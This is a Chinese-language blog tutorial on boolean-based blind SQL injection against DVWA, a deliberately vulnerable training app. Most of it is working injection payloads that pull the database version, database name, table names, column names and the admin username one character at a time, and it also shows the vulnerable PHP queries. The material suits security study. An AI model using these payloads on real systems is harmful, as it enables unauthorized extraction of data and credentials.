---
layout: post
title: "DVWA Blind SQL Injection (教學用)"
description: ""
date: 2023-07-11
categories:
  - DVWA
  - DVWA_SQL_Injection
author: ""
tags: ['DVWA', 'SQL_Injection']
---



# DVWA Blind SQL Injection (教學用)

###### tags: `DVWA`


一般SQL 注入，會把資料帶到頁面顯示。

盲注不一樣，他只會說帳號 存在 OR 不存在，也就是是與否。


### 注入的思路:

只要語句正確，就 TRUE
只要語句錯誤，就 FALSE

依照網頁 TRUE FALSE 的資訊，判變封包長度。

盲注會很耗時間
先查出字串長度，在查出每一個字元是啥。


## low

猜測語句

code:
```php
 $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```


### 以下都可成功(但分不清到底是字串，還是數字)
```
1 #

1' or '1

1 or 1
```

### 原因:

即使亂打也會看開頭第一個數字。
```
SELECT first_name, last_name FROM users WHERE user_id = '1aaa';

=

SELECT first_name, last_name FROM users WHERE user_id = '1';

```


### 用邏輯去判斷
結果:字串型
```
//正確
1' and '1

//錯誤
1' and 1

```


### version 名子長度 6
```
select length(version())=1;

select length(version())=2;

select length(version())=6;


```


```
1' and length(version())=6 #

```








### 查詢 version
```
select substring(version(),1,1)=1;
select substring(version(),1,1)=2;
select substring(version(),1,1)=3;
select substring(version(),1,1)=4;
select substring(version(),1,1)=5;


```



```
1' and  substring(version(),1,1)=5 # 
```

慢慢查可以查到全部的版本的名子。




### 數據庫名長度。

```
select length(database())=1;
select length(database())=2;
select length(database())=3;
select length(database())=4;
```


```
1' and length(database())=4 #
```



### 數據庫名:
dvwa

```
1' and substr((select database()),1,1) = 'd' #

1' and substr((select database()),2,1) = 'v' #

1' and substr((select database()),3,1) = 'w' #

1' and substr((select database()),4,1) = 'a' #
```







### 表數量 2
```
Select table_name  fRoM  information_schema.tables  wHeRe  table_schema='dvwa';


Select count(table_name) fRoM  information_schema.tables  wHeRe  table_schema='dvwa';


select (Select count(table_name) fRoM  information_schema.tables  wHeRe  table_schema='dvwa') = 2;

1' and  (Select count(table_name) fRoM  information_schema.tables  wHeRe  table_schema='dvwa') = 2 #

```


### 第一章表的名子長度 9 第二章表的名子長度 5

```

select length(table_name) from information_schema.tables where table_schema=database() limit 0,1;


1' and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1) = 9 #

1' and (select length(table_name) from information_schema.tables where table_schema=database() limit 1,1) = 5 #

```




### 第二章表的名子
users
```
select table_name from information_schema.tables where table_schema=database() limit 1,1;


select  substr( (select table_name from information_schema.tables where table_schema=database() limit 1,1) ,1 ,1 );


select ascii( substr( (select table_name from information_schema.tables where table_schema=database() limit 1,1) ,1 ,1 )  );


1' and ascii( substr( (select table_name from information_schema.tables where table_schema=database() limit 1,1) ,1 ,1 )  ) =117  #
1' and ascii( substr( (select table_name from information_schema.tables where table_schema=database() limit 1,1) ,2 ,1 )  ) =115  #
1' and ascii( substr( (select table_name from information_schema.tables where table_schema=database() limit 1,1) ,3 ,1 )  ) =101  #
1' and ascii( substr( (select table_name from information_schema.tables where table_schema=database() limit 1,1) ,4 ,1 )  ) =114  #
1' and ascii( substr( (select table_name from information_schema.tables where table_schema=database() limit 1,1) ,5 ,1 )  ) =115  #


```



### 第二章表的欄位數 8

```
select count(column_name) from information_schema.columns where table_schema=database() and table_name='users';



1' and ( select count(column_name) from information_schema.columns where table_schema=database() and table_name='users') = 1 #
.
.
.
.

1' and ( select count(column_name) from information_schema.columns where table_schema=database() and table_name='users') = 8 #

```





### 第一欄的名子長度 7
```
select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1;

select length(column_name) from information_schema.columns where table_schema=database() and table_name='users' limit 0,1;

1' and (select length(column_name) from information_schema.columns where table_schema=database() and table_name='users' limit 0,1) = 7 #
```









### 第一欄的名子
user_id
```
select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1;



(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)


select substr(     (select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)      ,1,1  );


select ascii(     substr(     (select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)      ,1,1  )         );






1' and ascii(     substr(     (select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)      ,1,1  )         )=117 #



1' and ascii(     substr(     (select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)      ,2,1  )         )=115 #


1' and ascii(     substr(     (select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)      ,3,1  )         )=101 #



1' and ascii(     substr(     (select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)      ,4,1  )         )=114 #


1' and ascii(     substr(     (select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)      ,5,1  )         )=95 #


1' and ascii(     substr(     (select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)      ,6,1  )         )=105 #


1' and ascii(     substr(     (select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)      ,7,1  )         )=100 #


```






###  查詢第一欄的第一筆資料長度 5

假設拿到第三欄位名為 user

```

select user from users limit 0,1;

select length(user) from users limit 0,1;


1' and (select length(user) from users limit 0,1) = 1 #
1' and (select length(user) from users limit 0,1) = 2 #
1' and (select length(user) from users limit 0,1) = 3 #
1' and (select length(user) from users limit 0,1) = 4 #
1' and (select length(user) from users limit 0,1) = 5 #


```


### 查詢user欄的第一筆資料名稱
admin
```
select substr(user,1,1) from users limit 0,1;

select ascii(substr(user,1,1)) from users limit 0,1;



1' and (select ascii(substr(user,1,1)) from users limit 0,1) = 97  #
1' and (select ascii(substr(user,2,1)) from users limit 0,1) = 100  #
1' and (select ascii(substr(user,3,1)) from users limit 0,1) = 109  #
1' and (select ascii(substr(user,4,1)) from users limit 0,1) = 105  #
1' and (select ascii(substr(user,5,1)) from users limit 0,1) = 110  #
```


## medium


數字型
```
$query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
```

注入原理都一樣。



## high



字串型

```
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
```
注入原理都一樣。
